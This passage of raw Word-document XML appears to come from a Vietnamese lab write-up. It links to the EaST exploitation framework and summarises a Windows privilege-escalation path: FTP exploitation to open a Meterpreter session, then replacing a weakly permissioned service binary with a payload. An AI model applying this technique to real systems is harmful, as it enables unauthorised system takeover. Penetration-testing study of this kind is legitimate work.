                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId33"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3015615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0EDAF6" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn công cụ EaST: </w:t>
      </w:r>
      <w:hyperlink r:id="rId34">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>https://github.com/C0reL0ader/EaST</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DF2CAA3" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56549CB1" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Quá trình thực hiện bắt đầu từ khai thác dịch vụ FTP để tạo phiên Meterpreter, kiểm tra quyền của người dùng, phát hiện quyền ghi yếu trên SecurityService.exe, tạo payload thay thế dịch vụ và kích hoạt payload sau khi khởi động lại Windows. Kết quả cuối cùng cần được xác nhận bằng lệnh getuid hoặc whoami trong phiên Meterpreter mới.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="006A2813"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A20CDA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="918E5A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6D05A5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="886645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9123917">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1562328501">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1041443412">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="111364512">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1419718456">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="240414993">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="101415041">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="725883701">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1224487760">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="945775806">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1535919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EF9"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001A1844"/>
    <w:rsid w:val="00215C38"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002C44B9"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00486CA4"/>
    <w:rsid w:val="005B1B10"/>
    <w:rsid w:val="00613115"/>
    <w:rsid w:val="006A2813"/>
    <w:rsid w:val="007B0CCA"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DC33AC"/>
    <w:rsid w:val="00DD2A5D"/>
    <w:rsid w:val="00E571DD"/>
    <w:rsid w:val="00EE2CCF"/>
    <w:rsid w:val="00F63D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C2551"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{83D764F9-B3A4-45E2-8DE7-3E59FE3E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b/>
      <w:bCs/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00FC693F"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="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hyperlink" Target="https://github.com/C0reL0ader/EaS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drive.google.com/drive/folders/1k8K8qn8KmFWZ137e53dDQiK6-mQU-FIl"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15</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2026-07-25T18:45:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>